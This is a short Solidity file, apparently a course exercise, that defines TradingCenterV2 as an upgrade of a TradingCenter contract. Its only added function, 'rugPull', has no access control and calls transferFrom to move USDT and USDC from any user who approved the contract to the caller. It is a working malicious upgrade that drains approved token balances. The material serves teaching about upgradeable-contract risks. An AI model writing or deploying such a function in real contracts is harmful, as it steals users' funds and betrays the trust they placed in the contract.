// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    function rugPull(address from, uint256 amount) public {
        IERC20 _usdt = usdt;
        IERC20 _usdc = usdc;

        _usdt.transferFrom(from,msg.sender,amount);
        _usdc.transferFrom(from,msg.sender,amount);
    }
}